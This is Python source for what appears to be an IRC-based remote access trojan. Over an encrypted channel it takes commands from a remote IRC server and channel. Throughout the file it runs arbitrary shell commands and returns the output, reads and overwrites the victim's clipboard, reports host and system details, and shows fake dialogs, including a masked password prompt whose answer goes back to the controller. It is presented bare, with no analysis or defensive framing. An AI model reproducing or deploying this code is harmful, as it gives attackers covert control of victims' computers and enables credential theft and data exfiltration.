import socket
from cryptography import fernet
from os import getcwd, chdir
from subprocess import check_output,STDOUT
from pymsgbox import alert,confirm,prompt,password
from clipboard import paste , copy
from platform import uname
def clearBuffer(sock,time):
    sock.settimeout(time)
    while 1:
        try:
            sock.recv(1000000)
        except socket.timeout :
            break
def processor(irc , server , channel , port , key , botnick):
    cryPobj=fernet.Fernet(key)
    irc.connect((server, port))
    irc.send(("USER "+ botnick +" "+ botnick +" "+ botnick +" :T\n").encode())
    irc.send(("NICK "+ botnick +"\n").encode())
    irc.send(("PRIVMSG nickserv :iNOOPE\r\n").encode())
    irc.send(("JOIN "+ channel +"\n").encode())
    clearBuffer(irc,11)
    irc.settimeout(None)
    def send(sock,msg):
        sock.send(f"PRIVMSG {channel} :REP:{(cryPobj.encrypt(msg.encode())).decode()}\r\n".encode())
    while 1:
        clearBuffer(irc,0.5)
        irc.settimeout(None)
        text=irc.recv(10024).decode()
        try:
            if "MSG:" in text:
                text=text.split("MSG:")[-1]
                text=cryPobj.decrypt(text.encode()).decode().strip()
                if text=="Gpwd" :
                    send(irc, socket.gethostname()+f"[{getcwd()}]")
                elif "cd" in text:
                    path=text.split("cd")[-1].strip()
                    if path:
                        chdir(path)
                        send(irc, "DONE :)")
                elif "wclipboard" in text:
                    text=text.strip().replace("CMD:", "").replace("wclipboard ", "")
                    copy(text)
                    send(irc, "DONE :)")
                elif "sysinfo" in text:
                    my_system = uname() 
                    send(irc,f"""System: {my_system.system} , Node Name: {my_system.node} , Release: {my_system.release} , Version: {my_system.version} , Machine: {my_system.machine} , Processor: {my_system.processor}""")
                elif "rclipboard" in text :
                    send(irc, paste())
                elif "CMD:" in text :
                    out=check_output(text.split("CMD:")[-1],stderr=STDOUT,shell=True)
                    send(irc, out.decode())
                elif "POPUP" in text:
                    text = text.split(":")
                    text=list(filter((" ").__ne__, text))
                    text=list(filter(("  ").__ne__, text))
                    if text[1]=="alert":
                        alert(text[2],text[3])
                        send(irc, "DONE :)")
                    elif text[1]=="confr":
                        lsButtons=text[4].split(',')
                        resault=confirm(text=text[2], title=text[3], buttons=lsButtons)
                        send(irc , resault)
                    elif text[1]=="qstion":
                        resault=prompt(text=text[2], title=text[3])
                        send(irc , resault)
                    elif text[1]=="passwd":
                        resault=password(text=text[2], title=text[3], mask='*')
                        send(irc , resault)
                    else :
                        send(irc , f"{text[1]} NOT FOUND :(")
        except Exception as err :
            send(irc, str(err))